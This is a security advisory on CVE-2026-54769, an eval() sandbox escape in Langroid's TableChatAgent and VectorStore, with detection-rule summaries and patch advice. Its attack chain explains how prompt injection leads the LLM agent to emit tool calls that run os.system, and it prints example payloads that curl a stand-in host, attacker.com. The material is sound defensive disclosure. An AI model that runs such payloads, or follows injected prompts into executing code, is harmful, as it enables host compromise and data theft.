---
title: Langroid Sandbox Escape via Incomplete eval() Mitigation
slug: 2026-07-sandbox-escape-langroid
description: Langroid is vulnerable to a critical Remote Code Execution (RCE) in its `TableChatAgent` and `VectorStore` components when `full_eval=True` due to CVE-2026-54769; the `eval()` function fails to properly scrub `__builtins__` from `globals`, allowing attackers to inject `__import__('os').system()` calls via crafted prompt payloads, leading to unauthenticated RCE, unauthorized data access, or system compromise on the host running the Langroid agent.
date: "2026-07-06T20:44:54Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - rce
  - sandbox-escape
  - llm
  - python
  - supply-chain
vendors:
  - Langroid
products:
  - Langroid (<= 0.65.1)
affected_os:
  - Windows
  - Linux
  - macOS
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: The `os.system()` function executes the attacker-supplied command (e.g., `__import__('os').system('curl http://attacker.com/pwned')` or `__import__('os').system('touch /tmp/rce_success_table')`).
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
iocs:
  - type: domain
    value: attacker.com
ioc_counts:
  domain: 1
rules:
  - title: Detect CVE-2026-54769 Exploitation — Python Spawning Suspicious Curl Command (Windows)
    description: Detects exploitation of CVE-2026-54769 in Langroid, where a vulnerable eval() function leads to a Python process spawning 'curl.exe' with a suspicious command line, indicating RCE.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.006
    data_sources:
      - process_creation
      - windows
  - title: Detect CVE-2026-54769 Exploitation — Python Spawning Suspicious Touch Command (Linux)
    description: Detects exploitation of CVE-2026-54769 in Langroid, where a vulnerable eval() function leads to a Python process spawning 'touch' with a suspicious command line, indicating RCE.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.006
    data_sources:
      - process_creation
      - linux
rules_count: 2
---

Attackers can exploit a critical sandbox escape vulnerability, CVE-2026-54769, in the Langroid framework (versions <= 0.65.1) to achieve unauthenticated Remote Code Execution (RCE). This flaw specifically affects the `TableChatAgent` and `VectorStore` components when configured with `full_eval=True`. The vulnerability stems from an incomplete mitigation in Python's `eval()` function, where the `__builtins__` dictionary is not explicitly scrubbed from `globals`, despite attempts to set `locals` to an empty dictionary. This oversight allows attackers to use prompt injection to force the underlying Large Language Model (LLM) to generate tool calls that include `__import__('os').system()` commands, which are then executed by the vulnerable `eval()` function in `langroid/agent/special/table_chat_agent.py` or `langroid/vector_store/base.py`. This bypass permits arbitrary system command execution, posing a significant risk for data exfiltration, unauthorized database access, or full system compromise.

## Attack Chain

1. An attacker crafts a malicious prompt containing a tool call with an `expression` field set to a Python `os.system()` command (e.g., `__import__('os').system('curl http://attacker.com/pwned')`).
2. The attacker submits this crafted prompt to a Langroid application instance running a `TableChatAgent` or `VectorStore` configured with `full_eval=True` (e.g., Langroid version <= 0.65.1).
3. The application's underlying Large Language Model (LLM) processes the malicious prompt and, as instructed, generates a tool message containing the attacker-controlled Python `expression`.
4. The Langroid agent's `eval()` function (specifically within `table_chat_agent.py` or `base.py`) attempts to execute this `expression` using `eval(code, vars, {})`.
5. Due to an incomplete sandboxing implementation, where `__builtins__` are implicitly available via `globals` despite an empty `locals` dictionary, the `__import__('os').system()` call within the `expression` is successfully resolved and executed.
6. The `os.system()` function invokes a new process on the host system to execute the embedded command (e.g., `curl` for C2 communication or `touch` for arbitrary file creation).
7. This unauthenticated command execution achieves Remote Code Execution (RCE), allowing the attacker to interact with the host system's operating system environment.
8. The RCE enables further actions such as unauthorized data exfiltration, privilege escalation, or full system compromise.

## Impact

This vulnerability allows for a complete bypass of the application's intended security boundaries, directly enabling unauthenticated Remote Code Execution. The observed consequences include unauthorized database accesses, data exfiltration, or total system compromise, depending on the privileges of the user environment hosting the vulnerable Langroid agent process. Successful exploitation can lead to significant data breaches, loss of intellectual property, and extensive damage to the affected system and organization.

## Recommendation

*   Patch Langroid to a version greater than 0.65.1 to mitigate CVE-2026-54769.
*   Block traffic to `attacker.com` at your network perimeter using the IOC provided in this brief.
*   Deploy the Sigma rules provided in this brief to detect suspicious process creation activities originating from Python processes.
*   Enable Sysmon process-creation logging (Event ID 1) on Windows or audit logging for process creation on Linux systems to ensure telemetry for the provided rules.
